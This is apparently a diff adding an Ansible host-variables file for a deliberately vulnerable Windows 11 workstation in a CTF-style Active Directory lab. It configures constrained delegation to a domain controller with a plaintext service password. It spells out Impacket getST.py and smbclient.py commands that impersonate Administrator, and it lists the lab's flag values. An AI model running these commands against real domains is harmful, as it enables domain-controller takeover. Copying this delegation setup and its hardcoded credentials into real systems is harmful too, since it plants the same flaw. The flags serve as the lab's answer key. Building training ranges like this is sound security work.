@@ -1,0 +1,84 @@
+---
+# =============================================================================
+# WS02-WIN11 - Workstation 2 (Constrained Delegation Abuse)
+# =============================================================================
+# Role:        Constrained Delegation target → Silver Ticket to DC CIFS
+# OS:          Windows 11 Enterprise
+# Network:     Internal (172.16.50.22)
+# Attack Path: Phase D, Step 9 (Delegation Abuse)
+# =============================================================================
+
+hostname: WS02
+machine_role: workstation_delegation
+attack_phase: "D9"
+attack_name: "Constrained Delegation → Silver Ticket"
+
+# Network
+ansible_host: 172.16.50.22
+ansible_connection: winrm
+ansible_winrm_transport: ntlm
+ansible_winrm_server_cert_validation: ignore
+ansible_port: 5986
+ansible_winrm_scheme: https
+network_segment: internal
+gateway: 172.16.50.1
+
+# OS
+os_family: windows
+os_version: "Windows 11 Enterprise"
+
+# Constrained Delegation Configuration
+delegation:
+  type: "Constrained Delegation with Protocol Transition"
+  machine_account: "WS02$"
+  service_account: "svc_ws02"
+  service_password: "Deleg@te2024!"
+  trusted_for_delegation: true
+  allowed_to_delegate_to:
+    - "cifs/DC01.corp.local"
+    - "cifs/DC01"
+    - "ldap/DC01.corp.local"
+    - "ldap/DC01"
+  attack_technique: "S4U2Self + S4U2Proxy"
+  description: >
+    Both the WS02 machine account and svc_ws02 user account are configured
+    with constrained delegation to DC01's CIFS and LDAP services. An attacker
+    can forge a service ticket impersonating any user (including Administrator)
+    to access DC01's file system.
+
+# Vulnerabilities
+vulnerabilities:
+  constrained_delegation:
+    type: "Constrained Delegation Abuse"
+    vector: "S4U2Self + S4U2Proxy with protocol transition"
+    severity: critical
+    cvss: 8.8
+    target_service: "cifs/DC01.corp.local"
+    impersonated_user: "Administrator"
+    exploits:
+      get_ticket: >
+        getST.py -spn cifs/DC01.corp.local
+        -impersonate Administrator
+        corp.local/svc_ws02:Deleg@te2024!
+      use_ticket: >
+        export KRB5CCNAME=Administrator.ccache &&
+        smbclient.py -k -no-pass DC01.corp.local
+    result: "Full CIFS access to DC01 as Administrator"
+
+# CTF Flags
+flags:
+  user:
+    value: "black0ps{d3l3g4t10n_4bus3}"
+    path: 'C:\Users\Public\user.txt'
+    owner: Public
+    permissions: "readable"
+  root:
+    value: "black0ps{s1lv3r_t1ck3t_f0rg3d}"
+    path: 'C:\Users\Administrator\Desktop\root.txt'
+    owner: Administrator
+    permissions: "admin_only"
+
+# Resource allocation
+vm_memory: 4096
+vm_cpus: 2
+vm_gui: true
